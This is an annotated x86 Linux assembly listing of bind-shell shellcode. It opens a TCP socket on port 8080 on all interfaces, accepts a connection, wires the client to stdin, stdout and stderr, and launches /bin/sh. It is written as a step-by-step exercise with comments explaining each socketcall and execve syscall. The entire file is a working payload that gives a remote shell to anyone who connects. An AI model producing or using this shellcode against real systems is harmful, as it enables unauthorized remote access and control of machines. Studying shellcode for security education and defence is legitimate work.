global _start 

section text
_start:
	
	xor eax,eax    ;clear eax
	xor ebx,ebx    ;clear ebx
	xor edx,edx    ;clear edx

               ; /*   1. Build a basic IP socket:

	;server.socket(2,1,0)
	;int socketcall(int call, unsigned long *args); 
	;#define   NR_socketcall   102
	;#define SYS_SOCKET        1

    	mov al, 102    ;NR_socketcall
    	inc bl         ; int call = 1 , define SYS_SOCKET

	;pushing on the stack the socket arguments

	push edx       ; third arg to socket =0 : IPPROTO_IP
	push byte 0x1  ; second arg to socket =1: SOCK STREAM
	push byte 0x2  ; first arg to socket =2 : AF_INET

	mov ecx, esp   ; unsigned long *args =  the top of the stack .
	int 0x80       ; jmp into kernel mode , execte exete the syscall 102

	mov esi, eax   ; store the return value (eax) into esi (server)
;-----------------------------------------------------------------------

            ; /*   2. Bind the port and IP to the socket: */
	;bind(server,(struct sockaddr *)&serv_addr,0x10);
	; int socketcall(int call, unsigned long *args);
	; #define NR_socketcall 102
	; #define SYS_BIND      2

	mov al,102      ; NR_socketcall
	inc bl		;int call = 1 , define SYS_BIND

	;pushing on the stack the socket arguments

	push edx          ; serv_addr.sin_addr.s_addr. 0 - listen on 0.0.0.0 
	push word 0x901f  ; serv_addr.sin_port.0x9Olf //8080
	push word 2       ; AFINET
	mov ecx, esp      ; stores the address of struct 
	push byte 0x10    ; length of addr struct
	push ecx          ; pointer to addr struct
	push esi          ; save the file descriptor (server) to stack
	mov ecx, esp      ; set the second arg on socketcall
	
	; execute the SYS_BIND system call

   	int 0x80           ; jmp into kernel mode , execte exete the syscall 102

;----------------------------------------------------------------------------

            ; /*  3. Start the socket in listen mode */

	; listen(server,0);
	; int socketcall(int call, unsigned long *args); 
	; #define NR_socketcall 102
	; #define SYS_LISTEN    4

	push edx      ; edx=0 , used to terminate the next value
	push esi      ; push the file descriptor (server) to stack 
	mov ecx, esp  ; set the second arg to socketcall

	mov bl, 0x4   ;set first arg int call = 4 , define SYS_LISTEN
	mov al, 102

	int 0x80
;-----------------------------------------------------------------------------

	;/* 4. when a connection is made, return a handle to the client:*/

	;client=accept(server,0,0);
	; int socketcall(int call, unsigned long *args);
	; #define _NR_socketcall 102
	; #define SYS_ACCEPT     5

	push edx       ; edx=0 , used to terminate the next value 
	push edx       ; second arg to accept
	push esi       ; push the file descriptor (server) to stack 
	mov ecx, esp   ; set the second arg to socketcall


	inc bl         ;set first arg int call = 5 , define SYS_ACCEPT 
	mov al, 102

	int 0x80

	mov ebx, eax   ; copied return file descriptor (client) to ebx

;-----------------------------------------------------------------------------

     ;/* 5. connect client pipes to stdin,stdout,stderr */

	; int dup2(int oldfd, int newfd); duplicates a file descriptor 
	; #define _NR_dup2 63

	; dup2(client,0);
	xor ecx, ecx ;set second arg = 0 :connect stdin to client 
	mov al, 63  ; NR_dup2
	int 0x80

	; dup2(client,1);
	inc ecx    ; set second arg = 1 :connect stdout to client
	mov al,63  ; NR_dup2
	int 0x80

	; dup2(client,2);
	inc ecx     ; set second arg = 2 :connect connect stderr to client
	mov al, 63  ; NR_dup2
	int 0x80

;-----------------------------------------------------------------------------

         ; /* 6. Call execve shellcode */

	; execve("/bin/sh", 0 , 0); 
	; #define __NR_execve 11

	push edx ; edx=0 , used to terminate the next value
	push long 0x68732f2f ; code= "/bin//sh" --> code[::-1].encode("hex")
	push long 0x6e69622f ;'68732f2f6e69622f'push the little endian representation

	mov ebx, esp ; pointer to command string "bin//sh"
	push edx ; set secound arg , and push it into stack
	push ebx ; push the pointer

	mov ecx, esp
	mov al, 0x0b ; _NR_execve

	int 0x80
